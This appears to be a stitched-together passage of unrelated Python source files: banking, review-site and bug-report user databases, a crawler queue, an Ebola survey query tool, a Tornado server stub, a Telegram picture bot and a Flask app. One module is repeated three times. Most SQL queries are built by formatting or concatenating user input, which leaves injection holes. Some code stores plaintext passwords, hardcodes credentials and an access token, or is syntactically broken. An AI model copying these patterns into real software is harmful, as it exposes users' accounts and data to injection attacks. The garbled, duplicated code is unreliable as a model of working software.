            WHERE client_id = '{}'                    
        """.format(new_message, logged_user.get_client_id())                    

        cursor = self.__conn.cursor()

        cursor.execute(update_sql)                    
        self.__conn.commit()
        logged_user.set_message(new_message)

    def change_pass(self, new_pass, logged_user):
        update_sql = """
            UPDATE Clients
            SET password = '{}'                    
            WHERE client_id = '{}'                    
        """.format(new_pass, logged_user.get_client_id())                    

        cursor = self.__conn.cursor()

        cursor.execute(update_sql)                    
        self.__conn.commit()

    def register(self, username, password):
        insert_sql = """
            INSERT INTO Clients (username, password)
            VALUES ('{}', '{}')                    
        """.format(username, password)                    

# Da ne pravi registraciq, ako imeto ve4e e zaeto!!!

        cursor = self.__conn.cursor()

        cursor.execute(insert_sql)                    
        self.__conn.commit()

    def login(self, username, password):
        select_query = """
            SELECT client_id, username, balance, message
            FROM Clients
            WHERE username = '{}' AND password = '{}'                    
            LIMIT 1
        """.format(username, password)                    

        cursor = self.__conn.cursor()

        cursor.execute(select_query)                    
        user = cursor.fetchone()

        if(user):
            return Client(user[0], user[1], user[2], user[3])
        else:
            return False


import sqlite3
from passlib.hash import pbkdf2_sha256

db_path = "reviews.sqlite"

def create_user(username, password):
    
    # check for nd.edu email
    address = username[-6:-1] + username[len(username) - 1]
    if address == "nd.edu":
        # check for existence of username already

        conn = sqlite3.connect(db_path)
        with conn:
            c = conn.cursor()
            sql = "select * from userInfo where username = " + "'" + username + "'" 
            c.execute(sql)                    
            user = c.fetchone()
            if user:
                return False, "User already exists"
            else: # add user to the db
                pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)
                sql = 'insert into userInfo values("' + username + '", "' + pass_hash + '")'                    
                c.execute(sql)                    
                return True, "User created successfully"

    else:
        return False, "Please register with a valid nd.edu email address" 

def change_password(username, password):
    pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)
    conn = sqlite3.connect(db_path)
    with conn:
        c = conn.cursor()
        sql = "update userInfo set password = '" + str(pass_hash) + "' where username = '" + str(username) + "'"
        c.execute(sql)                    
        

        
def validate_user(username, password):
    
    conn = sqlite3.connect(db_path)
    with conn:
        c = conn.cursor()
        sql = "select * from userInfo where username = " + "'" + username + "'" 
        c.execute(sql)                    
        user = c.fetchone()
    
    if user is None:
        return False, "Username not found"
    
    if pbkdf2_sha256.verify(password, user[1]):
        return True, "Login Successful"
    else:
        return False, "Incorrect password"
    

import sqlite3
from passlib.hash import pbkdf2_sha256

db_path = "reviews.sqlite"

def create_user(username, password):
    
    # check for nd.edu email
    address = username[-6:-1] + username[len(username) - 1]
    if address == "nd.edu":
        # check for existence of username already

        conn = sqlite3.connect(db_path)
        with conn:
            c = conn.cursor()
            sql = "select * from userInfo where username = " + "'" + username + "'" 
            c.execute(sql)                    
            user = c.fetchone()
            if user:
                return False, "User already exists"
            else: # add user to the db
                pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)
                sql = 'insert into userInfo values("' + username + '", "' + pass_hash + '")'                    
                c.execute(sql)                    
                return True, "User created successfully"

    else:
        return False, "Please register with a valid nd.edu email address" 

def change_password(username, password):
    pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)
    conn = sqlite3.connect(db_path)
    with conn:
        c = conn.cursor()
        sql = "update userInfo set password = '" + str(pass_hash) + "' where username = '" + str(username) + "'"
        c.execute(sql)                    
        

        
def validate_user(username, password):
    
    conn = sqlite3.connect(db_path)
    with conn:
        c = conn.cursor()
        sql = "select * from userInfo where username = " + "'" + username + "'" 
        c.execute(sql)                    
        user = c.fetchone()
    
    if user is None:
        return False, "Username not found"
    
    if pbkdf2_sha256.verify(password, user[1]):
        return True, "Login Successful"
    else:
        return False, "Incorrect password"
    

import sqlite3
from passlib.hash import pbkdf2_sha256

db_path = "reviews.sqlite"

def create_user(username, password):
    
    # check for nd.edu email
    address = username[-6:-1] + username[len(username) - 1]
    if address == "nd.edu":
        # check for existence of username already

        conn = sqlite3.connect(db_path)
        with conn:
            c = conn.cursor()
            sql = "select * from userInfo where username = " + "'" + username + "'" 
            c.execute(sql)                    
            user = c.fetchone()
            if user:
                return False, "User already exists"
            else: # add user to the db
                pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)
                sql = 'insert into userInfo values("' + username + '", "' + pass_hash + '")'                    
                c.execute(sql)                    
                return True, "User created successfully"

    else:
        return False, "Please register with a valid nd.edu email address" 

def change_password(username, password):
    pass_hash = pbkdf2_sha256.encrypt(password, rounds=200, salt_size=16)
    conn = sqlite3.connect(db_path)
    with conn:
        c = conn.cursor()
        sql = "update userInfo set password = '" + str(pass_hash) + "' where username = '" + str(username) + "'"
        c.execute(sql)                    
        

        
def validate_user(username, password):
    
    conn = sqlite3.connect(db_path)
    with conn:
        c = conn.cursor()
        sql = "select * from userInfo where username = " + "'" + username + "'" 
        c.execute(sql)                    
        user = c.fetchone()
    
    if user is None:
        return False, "Username not found"
    
    if pbkdf2_sha256.verify(password, user[1]):
        return True, "Login Successful"
    else:
        return False, "Incorrect password"
    

import pymysql, re
from threading import Thread
from sys import exit

class Database(object):
    def __init__(self, user, password, database):
        try:
            self.db = pymysql.connect (
                        host="127.0.0.1",
                        port=3306,
                        user=user,
                        password=password,
                        db=database
                      )
            self.cursor = self.db.cursor()
        except Exception as e:
            print(e)
            exit()

    def getQueue(self, numberOfLinks=10):
        self.cursor.execute("SELECT url FROM queue WHERE visited = '0' LIMIT {};".format(numberOfLinks))                    
        result = self.cursor.fetchall()
        self.remove(result)
        return result


    def writeToDb(self, url):
        try:
            self.cursor.execute("INSERT INTO queue (url, visited) VALUES ('{}', '0');".format(url))                    
            self.db.commit()
        except Exception as e:
            print(e)

    def setQueue(self, obj):
        for url in obj:
            t = Thread(target=self.writeToDb(url))
            t.daemon = True
            t.start()
        return True

    def remove(self, obj):
        sql = "UPDATE queue SET visited='1' WHERE url = '{}';"                    
        for line in obj:
            url = re.sub("[\(\)\']", "", line[0])                    
            t = Thread(target=self.execute(sql.format(url)))                    
            t.daemon = True
            t.start()

    def clear(self):
        self.cursor.execute("DELETE FROM queue;")

    def execute(self, command):
        self.cursor.execute(command)
        self.db.commit()

    def close(self):
        self.db.close()

# Create connection to database

import pymysql

def create_connection():
    try:
        connection = pymysql.connect(host   = "localhost",
                                     user   = "root",
                                     passwd = "",
                                     db     = "ebola")
    
    except pymysql.Error as error:
        print ("connection error: ", error)
   
    return connection


def destroy_connection(conn):
    conn.close()

def run_insert(insert_stmt):
    is_success = True
    try:
        conn = create_connection()
        cur = conn.cursor()
        cur.execute(insert_stmt)
        results = cur.fetchall()

        widths = []
        columns = []
        tavnit = '|'
        separator = '+' 

        for cd in cur.description:
            widths.append(max(cd[2], len(cd[0])))                    
            columns.append(cd[0])

        for w in widths:
            tavnit += " %-"+"%ss |" % (w,)
            separator += '-'*w + '--+'

        print(separator)
        print(tavnit % tuple(columns))
        print(separator)
        for row in results:
            print(tavnit % row)
        print(separator)


        # for row in result:
            # print row
        conn.commit()
        destroy_connection(conn)

    except pymysql.Error as error:
        print ("insert error: ", error)                    
        is_success = False
    return is_success

# CLI query interface for Ebola database in Python
import pymysql
from db_connect import *
from query_functions import *

def print_menu():
    print ('\nQuery options:')
    print ('1:  List ETCs in the country __ having more than __ open beds.')
    print ('2:  List average age & education of respondents whose sex=__ and live in __.')
    print ('3:  Count the respondents whose sex=__ and who have at least an education of __.')
    print ('4:  Display partner organizations with their longitude/latitude coordinates.')
    print ('5:  Display a chosen organization __ & codes of the ETCs it is working with.')
    print ('6:  Display all distinct organization types.')
    print ('7:  Display every respondent\'s (whose sex=__) info & their country\'s info.')
    print ('8:  Display every ETC that isn\'t closed & its info/partner organization.')
    print ('9:  List countries in ascending order by GDP.')
    print ('10: Count the respondents (with sex=__, education>=__, and country=__) who think their community was well organized.')
    print ('11: Show gender, age, education, and country of survey respondents ordered by age.')
    print ('12: Show ETC names and Partner Orgs ordered by ETC names.')
    print ('13: Show ETC name, Selected Partner Org, and Country GDP ordered by Country.')
    print ('14: Show average age of selected gender of survey respondents.')
    print ('15: Show average educaiton level of selected gender of survey respondents.\n')

def run_another():
    opt = raw_input('Run another query? (y/n): ')
    if (opt == 'y' or opt == 'Y'):
        print_menu()
        run_query_case()
    else:
        print('Goodbye.')                    

def run_query_case():
    case = int(input('Enter query option number: '))
    if (case == 1):
        etc_open_beds()
        run_another()
    elif (case == 2):
        age_edu_sex_country()
        run_another()
    elif (case == 3):
        count_sex_educ()
        run_another()
    elif (case == 4):
        partner_lat_long()
        run_another()
    elif (case == 5):
        org_ETC_codes()
        run_another()
    elif (case == 6):
        distinct_org_types()
        run_another()
    elif (case == 7):
        respondent_country_info()
        run_another()
    elif (case == 8):
        non_closed_ETC_partner()
        run_another()
    elif (case == 9):
        country_gdp()
        run_another()
    elif (case == 10):
        count_organized()
        run_another()
    elif (case == 11):
        surveyresp_country_byAge()
        run_another()
    elif (case == 12):
        etc_limited_byName()
        run_another()
    elif (case == 13):
        partner_org_limited_byCountry()
        run_another()
    elif (case == 14):
        avg_age_resp()
        run_another()
    elif (case == 15):
        avg_edu_resp()
        run_another()
    else:
        print("Sorry, that is not an option.")
        run_another()


# run_insert error checking
# ...


def main():
    print ('========= QUERY INTERFACE FOR EBOLA DATABSE =========\n')

    # create views
    print ('...Creating views')
    create_view_SurveyResp_Country()
    create_view_etc_limited()
    
    # print query options menu
    print_menu()
    
    # prompt user for query option
    run_query_case()

    print('\n============== END PROGRAM ==============')
main()

import mysql.connector
from werkzeug.security import generate_password_hash, check_password_hash

class DatabaseController(object):
        def __init__(self, connection_address, connection_port, user_name, password, database):
                self.connection = mysql.connector.connect(host = connection_address, user=user_name, password = password, db = database)
                self.cursor = self.connection.cursor(buffered=True)
        def create_junk_table(self):                    
                query = "CREATE TABLE IF NOT EXISTS DPNET(why_mySQL int)"
                self.cursor.execute(query)                    
                self.connection.commit()
        def destroy_junk_table(self):                    
                query = "DROP TABLE IF EXISTS DPNET"
                self.cursor.execute(query)                    
                self.connection.commit()

        def verify_account(self, email, user_password):
                query = "SELECT Pass FROM user WHERE Email = '" + email +"'"                    
                self.cursor.execute(query)                    
                fetch = self.cursor.fetchone()
                password = " ".join(map(str, fetch))
                return check_password_hash(password, user_password)

        def set_report(self, reportID, userID, summary, description):
                query = "INSERT INTO `testdb`.`report` (`Report_ID`, `User_ID`, `Summary`, `Description`, `Votes`, `Is_Resolved`) VALUES ('" + reportID + "', '" + userID + "', '" + summary + "', '" + description + "', '0', '0')"                    
                self.cursor.execute(query)                    
                self.connection.commit()

        def increment_vote(self, reportID):
                query1 = "SELECT Votes FROM report WHERE Report_ID = '" + reportID +"'"                    
                self.cursor.execute(query1)                    
                fetch = self.cursor.fetchone()
                curVote = " ".join(map(str, fetch))
                intVote = int(curVote)
                intVote = intVote + 1
                query2 = "UPDATE `testdb`.`report` SET `Votes` = '" + str(intVote) + "' WHERE `report`.`Report_ID` = " + reportID                    
                self.cursor.execute(query2)                    
                self.connection.commit()

        def get_vote(self, reportID):
                query1 = "SELECT Votes FROM report WHERE Report_ID = '" + reportID +"'"                    
                self.cursor.execute(query1)                    
                fetch = self.cursor.fetchone()
                curVote = " ".join(map(str, fetch))
                intVote = int(curVote)
                return intVote

        def resolve_issue(self, reportID):
                query = "UPDATE `testdb`.`report` SET `Is_Resolved` = '1' WHERE `report`.`Report_ID` = " + reportID                    
                self.cursor.execute(query)                    
                self.connection.commit()

        def get_report(self, reportID):
                query = "SELECT * FROM report WHERE Report_ID = " + reportID                     
                self.cursor.execute(query)                    
                self.connection.commit()
                fetch = self.cursor.fetchone()
                report = " ".join(map(str, fetch))
                return report

        def create_basic_user(self, userID, fName, lName, email, password):
                password2 = generate_password_hash(password)
                query = "INSERT INTO `testdb`.`user` (`ID`, `FName`, `LName`, `Email`, `Pass`, `Role`) VALUES ('" + userID + "', '" + fName + "', '" + lName + "', '" + email +"', '" + password2 + "', '0')"                    
                self.cursor.execute(query)                    
                self.connection.commit()

        def create_faculty_user(self, userID, fName, lName, email, password):
                password2 = generate_password_hash(password)
                query = "INSERT INTO `testdb`.`user` (`ID`, `FName`, `LName`, `Email`, `Pass`, `Role`) VALUES ('" + userID + "', '" + fName + "', '" + lName + "', '" + email +"', '" + password2 + "', '1')"                    
                self.cursor.execute(query)                    
                self.connection.commit()
        
        def close_connection(self):
                self.connection.close()
        
dbc = DatabaseController('localhost', 3306, 'testuser', 'test623', 'testdb')                    
dbc.create_basic_user("1586390", "Daniel", "Gonzalez", "dgonz023@fiu.edu", "dpnet")                    
print(dbc.verify_account("dgonz023@fiu.edu", "dpnet"))                    


import os
import tornado.httpserver
import tornado.ioloop
import tornado.options
import tornado.web

from tornado.options import define, options
define("port", default=8000, help="run on specified port", type=int)


class BaseController(tornado.web.RequestHandler):
    def get_current_user(self):
        return self.get_secure_cookie("username")

    #TODO: define this shit

class IndexController(tornado.web.RequestHandler):
    def get(self):                    
        self.render('index.html')#, user=self.current_user)
    #TODO: define this shit

'''class WebPageController(tornado.web.RequestHandler):'''
    #TODO: define this shit

class LoginController(BaseController):
    def get(self):                    
        self.render(login.html)                    
    def post(self):
        self.set_secure_cookie("username", self.get_argument("username"))#passed from html with the tag username                    
        #if PASSWORD is good, self.set_secure_cookie(username, self.get_argument("username"))
        self.redirect("/", permanent=True)#if permanent = true, when user refreshes, more form data will NOT be sent
    def get(self):                    
        self.render('login.html')#login.html page to be rendered

    class LogoutController(BaseController):
        def get(self):                    
            self.clear_cookie("username")
            self.redirect("/", permanent = true)
    #TODO: define this shit"""

class ReportController(BaseController):
    def get(self):                    
        self.render('report.html')
        
    class NewReportController(BaseController):
        @tornado.web.authenticated
        def get(self):                    
            self.render('create.html')
	    #ADDED by Jimmy and david, incomplete sample code
	    #def post(self):
	    #	variable_1 = self.get_argument("form variable name here")
	    #	....
	    #	if PASSWORD is good, self.set_secure_cookie(username, self.get_argument("username"))'''

	        #put appropriate fetches from template here and send to database

'''class UserProfileController(BaseController):'''
    #TODO: define this shit
    
def launch():
    server_settings = {"static_path": os.path.join(os.path.dirname(__file__), "./static"), 
    "template_path": "./server/templates", 
    "login_url": "/login", 
    "cookie_secret": os.urandom(24),                     
    "xsrf_cookies": True}                    

    handlers = [ (r'/', IndexController),
        (r'/report', ReportController),
        (r'/create', ReportController.NewReportController), 
        (r'/login', LoginController), 
        (r'/logout', LoginController.LogoutController) ]
    
    application = tornado.web.Application(handlers, **server_settings)
    http_server = tornado.httpserver.HTTPServer(application)
    http_server.listen(options.port)
    tornado.ioloop.IOLoop.instance().start()

'''
Created on 2012-8-9

@author: diracfang
'''

class User(object):
    
    def __init__(self, db, access_token):
        self.db = db
        self.access_token = access_token
    
    def get_user(self):
        if not hasattr(self, '_user'):
            qs = "select * from account_access where access_token = '%s'" % self.access_token                    
            result = self.db.get(qs)                    
            if result:
                self._user = result
            else:
                self._user = None
        
        return self._user
    
    def get_user_id(self):
        user = self.get_user()
        if user:
            user_id = user.user_id
        else:
            user_id = None
        
        return user_id

'''
Created on 2012-8-14

@author: diracfang
'''
import requests

def call_stream_api(url, access_token):
    headers = {'Cookie': 'access_token=%s' % access_token}
    r = requests.get(url, headers=headers)
    for line in r.iter_lines(chunk_size=8):
        if line:
            print line
        else:
            print 'keep-alive'
    
    
if __name__ == '__main__':
    access_token = '9920e647907355f3756dad8b1477da4bcc6850fe'                    
    url = 'http://test.kan.sohu.com/api/2/sync/stream'                    
    call_stream_api(url, access_token)

#!/usr/bin/python3 -u
# -*- coding: utf-8 -*-

#check if the version of Python is correct
from python_version_check import check_version
check_version((3, 4, 3))

VERSION_NUMBER = (1, 0, 10)                    

import logging
from random import choice
from time import time
import requests, json
from threading import Thread
from queue import Queue

from traceback_printer import full_traceback
from telegramHigh import TelegramHigh
from textual_data import *
from userparams import UserParams
from language_support import LanguageSupport
import utils
from file_db import FileDB
from button_handler import getMainMenu

from settings_reader import SettingsReader
sr = SettingsReader()


############
##PARAMETERS
############

#How often should a file list of images be updated, in seconds
FILE_UPDATE_PERIOD = sr.settings_reader(0)

#If true, use dropbox. If false, use local filesystem
FROM_DROPBOX = bool(sr.settings_reader(2) == "DB")

#A minimum and maximum picture sending period a user can set
MIN_PICTURE_SEND_PERIOD = 60
MAX_PICTURE_SEND_PERIOD = 86400

#A default send period
PICTURE_SEND_PERIOD = sr.settings_reader(1)


INITIAL_SUBSCRIBER_PARAMS = {"lang": "EN",  # bot's langauge
							 "subscribed": 0, # has the user subscribed?
							 "period": PICTURE_SEND_PERIOD,
							 "last_update_time" : 0
							 }


################
###GLOBALS######
################





#############
##METHODS###
############

###############
###CLASSES#####
###############

class MainPicSender():
	"""The bot class"""

	LAST_UPDATE_ID = None

	# Dictionary containing handles to picture-sending processes
	pic_sender_threads = {}

	def __init__(self, token):
		super(MainPicSender, self).__init__()
		self.bot = TelegramHigh(token)

		# Initialize user parameters database
		self.userparams = UserParams("users", initial=INITIAL_SUBSCRIBER_PARAMS)

		# Initialize file database
		self.file_db = FileDB("files")

		#get list of all image files
		self.updateFileListThread()

		# Initialize List of files
		self.files = []

		self.bot.start(processingFunction=self.processUpdate, periodicFunction=self.periodicRoutine)

	def processUpdate(self, u):
		bot = self.bot
		Message = u.message
		message = Message.text
		message_id = Message.message_id
		chat_id = Message.chat_id
		subs = self.userparams

		# initialize the user's params if they are not present yet
		subs.initializeUser(chat_id=chat_id, data=INITIAL_SUBSCRIBER_PARAMS)

		# language support class for convenience
		LS = LanguageSupport(subs.getEntry(chat_id=chat_id, param="lang"))
		lS = LS.languageSupport
		allv = LS.allVariants
		MMKM = lS(getMainMenu(subs.getEntry(chat_id=chat_id, param="subscribed")))

		if message == "/start":
			bot.sendMessage(chat_id=chat_id
				,message=lS(START_MESSAGE)
				,key_markup=MMKM
				)
		elif message == "/help" or message == HELP_BUTTON:
			bot.sendMessage(chat_id=chat_id
				,message=lS(HELP_MESSAGE).format(str(MIN_PICTURE_SEND_PERIOD),str(MAX_PICTURE_SEND_PERIOD))
				,key_markup=MMKM
				,markdown=True
				)
		elif message == "/about" or message == ABOUT_BUTTON:
			bot.sendMessage(chat_id=chat_id
				,message=lS(ABOUT_MESSAGE).format(".".join([str(i) for i in VERSION_NUMBER]))
				,key_markup=MMKM
				,markdown=True
				)
		elif message == "/otherbots" or message == lS(OTHER_BOTS_BUTTON):
			bot.sendMessage(chat_id=chat_id
				,message=lS(OTHER_BOTS_MESSAGE)
				,key_markup=MMKM
				,markdown=True
				)
		elif message == "/period" or message == lS(SHOW_PERIOD_BUTTON):
			period = self.userparams.getEntry(chat_id, "period")

			bot.sendMessage(chat_id=chat_id,
					message="""An image is sent to you every {0} seconds.""".format(period),
					key_markup=MMKM
							)
		elif message == "/subscribe" or message == SUBSCRIBE_BUTTON:
			period = self.userparams.getEntry(chat_id, "period")
			if self.userparams.getEntry(chat_id, "subscribed") == 0:
				self.userparams.setEntry(chat_id, "subscribed", 1)
				self.userparams.setEntry(chat_id, "last_update_time", time())
				MMKM = getMainMenu(subscribed=True)

				bot.sendMessage(chat_id=chat_id,
					message="""You're subscribed now! 
An image will be sent to you every {0} seconds. 
To cancel subscription enter /unsubscribe. 
To change the period of picture sending type a number.""".format(period),
					key_markup=MMKM
					)
			else:
				bot.sendMessage(chat_id=chat_id,
					message="""You have already subscribed!
To cancel subscription enter /unsubscribe.
To change the period of picture sending type a number.
Your current period is {0} seconds.""".format(period),
					key_markup=MMKM
					)
		elif message == "/unsubscribe" or message == UNSUBSCRIBE_BUTTON:
			if self.userparams.getEntry(chat_id, "subscribed") == 1:
				self.userparams.setEntry(chat_id, "subscribed", 0)
				MMKM = getMainMenu(subscribed=False)

				bot.sendMessage(chat_id=chat_id,
					message="You have unsubscribed. To subscribe again type /subscribe",
					key_markup=MMKM
					)
			else:
				bot.sendMessage(chat_id=chat_id,
					message="You haven't subscribed yet! To subscribe type /subscribe",
					key_markup=MMKM
					)
		elif message == "/gimmepic" or message == GIMMEPIC_BUTTON:
			self.startRandomPicThread(chat_id, MMKM)
		else:
			#any other message
			try:
				new_period = int(message)

				if self.userparams.getEntry(chat_id,"subscribed") == 0:
					bot.sendMessage(chat_id=chat_id,
									message="You're not subscribed yet! /subscribe first!"
									,key_markup=MMKM
									)
				else:
					#If a period is too small
					if new_period < MIN_PICTURE_SEND_PERIOD:
						self.userparams.setEntry(chat_id, "period", MIN_PICTURE_SEND_PERIOD)
						bot.sendMessage(chat_id=chat_id,
							message="The minimum possible period is {0}.\nSetting period to {0}.".format(str(MIN_PICTURE_SEND_PERIOD))
							,key_markup=MMKM
							)


					#If a period is too big
					elif new_period > MAX_PICTURE_SEND_PERIOD:
						self.userparams.setEntry(chat_id, "period", MAX_PICTURE_SEND_PERIOD)
						bot.sendMessage(chat_id=chat_id,
							message="The maximum possible period is {0}.\nSetting period to {0}.".format(str(MAX_PICTURE_SEND_PERIOD))
							,key_markup=MMKM
							)

					#If a period length is fine - accept
					else:
						self.userparams.setEntry(chat_id, "period", new_period)
						bot.sendMessage(chat_id=chat_id,
							message="Setting period to " + str(new_period) + "."
							,key_markup=MMKM
							)

					# Reset timer
					self.userparams.setEntry(chat_id, "last_update_time", int(time()))

			#user has sent a bullsh*t command
			except ValueError:
				bot.sendMessage(chat_id=chat_id,
					message="Unknown command!"
					,key_markup=MMKM
					)

	def periodicRoutine(self):
		'''
		A function that runs every second or so
		:return:
		'''
		# Update list of picture paths
		if not hasattr(self, 'update_filelist_thread_queue'):
			# Init queue
			self.update_filelist_thread_queue = Queue()
		while not self.update_filelist_thread_queue.empty():
			# update params from thread
			q = self.update_filelist_thread_queue.get()
			self.last_filelist_update_time = q[0]

		self.updateFileListThread()

		# TODO:Clean up finished pic sender threads

		# subscription handling
		for user in self.userparams.getAllEntries(fields=["subscribed","period","last_update_time","chat_id"]):
			if user[0] == 1:
				# user is subscribed
				cur_time = time()
				if (cur_time - user[2]) > user[1]:
					# The time has come for this user (heh, sounds intimidating)
					self.startRandomPicThread(user[3], MMKM=getMainMenu(True))
					# Reset the timer
					self.userparams.setEntry(user[3],"last_update_time", cur_time)




	def updateFileListThread(self):
		'''
		Starts the file list grabbing thread
		:return:
		'''
		if not hasattr(self, 'last_filelist_update_time') or (time()-self.last_filelist_update_time) >  FILE_UPDATE_PERIOD:
			# Run updater is it's time already
			if not (hasattr(self, 'filelist_updater_thread') and self.filelist_updater_thread.isAlive()):
				# Run the thread if it is not working yet (never existed or already terminated, respectively).
				self.filelist_updater_thread = Thread(target=self.updateFileList)
				self.filelist_updater_thread.start()
			else:
				pass
				print("updater already running!")#debug

	def fileToDB(self, filepath, mod_time):
		"""
		Adds or updates a file in the database
		:param mod_time: When the real file was modified, in Unix time
		:param filepath: a full path to a file to process
		:return:
		"""
		file_db = self.file_db

		if path.splitext(filepath)[1].replace(".", "").lower() != "txt":
			# it's an image
			if not file_db.fileExists(filepath):
				file_db.addFile(filepath, mod_time=mod_time)
			elif mod_time > file_db.getModTime(filepath):
				#file has updated, invalidate the cached telegram file ID and update the mod time in DB
				file_db.invalidateCached(filepath)
				file_db.updateModTime(filepath, mod_time)
		else:
			#TODO: read metadata from dropbox
			# it's a text file
			if path.basename(filepath) == METADATA_FILENAME:
				#it's a metadata file
				def getMetadata():
					# Update the obsolete metadata
					metadata = ""
					try:
						if not FROM_DROPBOX:
							with open(filepath, 'r') as f:
								metadata = f.read()
						else:
							metadata = self.getDropboxFile(filepath).decode()
					except Exception as e:
						logging.error("Could not read metafile!", full_traceback())
					return metadata
				if not file_db.fileExists(filepath):
					# add a folder entry with metadata. Path in DB will be the full path to metadata text file
					file_db.addMetafile(filepath, getMetadata(), mod_time)
				elif mod_time > file_db.getModTime(filepath):
					file_db.updateMetadata(filepath, getMetadata(), mod_time)


	def checkFilesForDeletion(self, files):
		"""
		Checks the database for the presence of files that don't exist anymore.
		:param files: list of files received from an actual filesystem scan
		:return:
		"""
		file_db = self.file_db

		# Get a list of paths in database
		DB_files = file_db.getFileList()

		for f in DB_files:
			if not f in files:
				file_db.deleteFile(f)


	def updateFileList(self):
		'''
		THREAD
		Reads the files in the directory and updates the file list
		'''

		if not FROM_DROPBOX:
			# list of filepaths
			files = utils.FolderSearch.getFilepathsInclSubfolders(PIC_FOLDER, allowed_extensions=["txt","png","jpg","jpeg"])

			# When the file was modified, in Unix time
			# list of tuples (filepath, mod_time)
			files_and_mods = list(zip(files,
				[utils.FileUtils.getModificationTimeUnix(f) for f in files]
			))
		else:
			files_and_mods = utils.DropboxFolderSearch.getFilepathsInclSubfoldersDropboxPublic(DROPBOX_FOLDER_LINK,
																							   DROPBOX_APP_KEY,
																							   DROPBOX_SECRET_KEY,
																							   unixify_mod_time=True
																							   )
			files = [i[0] for i in files_and_mods]

		# Add or update files to DB
		for i in files_and_mods:
			self.fileToDB(i[0], i[1])

		# Delete files that no longer exist from DB
		self.checkFilesForDeletion(files)

		# Update the time
		last_filelist_update_time=time()

		# Put results to queue
		self.update_filelist_thread_queue.put((last_filelist_update_time,))

	@staticmethod
	def getDropboxFile(filepath):
		"""
		Gets the data from a file in Dropbox
		:param filepath: path to a file in Dropbox
		:return:  bytestring containing data from file
		"""
		data = None
		# First, get metadata of a file. It contains a direct link to it!
		req=requests.post('https://api.dropbox.com/1/metadata/link',
						  data=dict( link=DROPBOX_FOLDER_LINK,
									 client_id=DROPBOX_APP_KEY,
									 client_secret=DROPBOX_SECRET_KEY,
									 path=filepath), timeout=5 )
		if req.ok:
			# If metadata got grabbed, extract a link to a file and make a downloadable version of it
			req= json.loads(req.content.decode())['link'].split("?")[0] + "?dl=1"
			# Now let's get the file contents
			try:
				req=requests.get(req, timeout=5)
				if req.ok:
					data = req.content
			except:
				data = None
		else:
			#handle absence of file (maybe got deleted?)
			data = None

		return data

	def startRandomPicThread(self, chat_id, MMKM):
		"""
		Starts a random pic sending thread
		:param chat_id: a user to send pic to
		:return:
		"""
		def startThread(chat_id):
			t = Thread(target=self.sendRandomPic, args=(chat_id, MMKM,))
			self.pic_sender_threads[chat_id] = t
			t.start()

		try:
			if not self.pic_sender_threads[chat_id].isAlive():
				# Start the thread if it is dead
				startThread(chat_id)
			else:
				self.bot.sendMessage(chat_id=chat_id,
					message="I'm still sending you a pic. Please wait!"
					)
		except KeyError:
			# If there was never a thread for this user, start it.
			startThread(chat_id)

	def sendRandomPic(self, chat_id, MMKM):
		"""
		THREAD
		Sends a random picture from a file list to a user.
		:param chat_id:
		:return:
		"""
		def getLocalFile(filepath):
			"""
			Gets the data from a local file
			:param filepath: path to a local file to get data
			:return: bytestring containing data from file
			"""
			with open(filepath, 'rb') as f:
				data = f.read()

			return data


		sent_message, cached_ID, data, random_file, caption = None, None, None, None, ""
		while True:
			try:
				# get list of files
				files = self.file_db.getFileListPics()
				# pick a file at random
				random_file = choice(files)
			except IndexError:
				# DB is empty. Exit the function
				self.bot.sendMessage(chat_id=chat_id,
									message="Sorry, no pictures were found!",
									key_markup=MMKM
									)
				return

			# get the ID of a file in Telegram, if present
			cached_ID = self.file_db.getFileCacheID(random_file)
			# Get the metadata to send with a pic
			caption = self.file_db.getCaptionPic(random_file)

			while True:
				if not cached_ID:
					# if file is not cached in Telegram
					try:
						# We will send a bytestring
						if not FROM_DROPBOX:
							data = getLocalFile(random_file)
							print("Not cached, getting a local file!")#debug
						else:
							# data = None
							print("Not cached, getting a file from Dropbox!")#debug
							data = self.getDropboxFile(random_file)

					except Exception as e:
						logging.error("Error reading file!" + full_traceback())
						#File still exists in the DB, but is gone for real. Try another file.
						break
				else:
					# file is cached, use resending of cache
					data = cached_ID
					print("Cached, sending cached file!")

				try:
					# Send the pic and get the message object to store the file ID
					sent_message = self.bot.sendPic(chat_id=chat_id,
									pic=data,
									caption=caption,
									key_markup=MMKM
									)
					# print("sent_message", sent_message)#debug
					break
				except Exception as e:
					if "Network error" in str(e):
						print("Cache damaged! Trying to send image by uploading!")
						# cached ID is invalid. Remove it and upload the image.
						self.file_db.invalidateCached(random_file)
						cached_ID = None

			if not data:
				# If there is no data, the file could not be read. Come back to the beginning of the loop
				# and try picking a different random file
				continue
			else:
				# Data exists and was sent, exit loop
				break


		if sent_message == None:
			self.bot.sendMessage(chat_id=chat_id,
								message="Error sending image! Please, try again!",
								key_markup=MMKM
							)
		elif not cached_ID:
			file_id = self.bot.getFileID_byMesssageObject(sent_message)
			self.file_db.updateCacheID(random_file, file_id)


def main():
	MainPicSender(BOT_TOKEN)

if __name__ == '__main__':
	main()




import model
import os, json
from flask import Flask, render_template, request
import MySQLdb as mdb

app = Flask(__name__)
db = mdb.connect(user="root", host="localhost", port=3306, db="demo")
cities_table = 'cities4'
JOBS_TABLE = 'postings'#jobs_cities2'
#weights = {'salary_f': 0.6, 'n1_f': 0.2, 'n2_f': 0.2}
output = ['city', 'latitude', 'longitude', 'image_url', 'description']
n_cities = 10

@app.route("/")
def hello():
    return render_template('index.html')

@app.route("/slideshow")
def slideshow():
    return render_template('slideshow.html')

@app.route("/_exp")
def exp():
    #keys = ['url', 'name', 'description', 'image_url', 'count', 'nbackers',
     #          'count', 'prediction']
    #results = [dict(zip(keys, ['%d'%i]*len(keys))) for i in range(1,4)]
    df = model.get_cities().reset_index()
    results = df.T.to_dict().values()[:n_cities]
    return render_template('exp_cards.html', results=results)
    #return render_template('exp_sliders.html', results=results)

@app.route('/maps')
def maps():
    job1 = request.args.get('job1', None, type=str)
    job2 = request.args.get('job2', None, type=str)
    return render_template('maps.html', job1=job1, job2=job2)

@app.route('/results')
def results():
    job1 = request.args.get('job1')
    job2 = request.args.get('job2')
    df = model.get_cities(job1, job2).reset_index()
    results = df.T.to_dict().values()[:n_cities]
    return render_template('results.html', results=results)

@app.route('/waypoints')
def waypoints():
    job1 = request.args.get('job1', None, type=str)
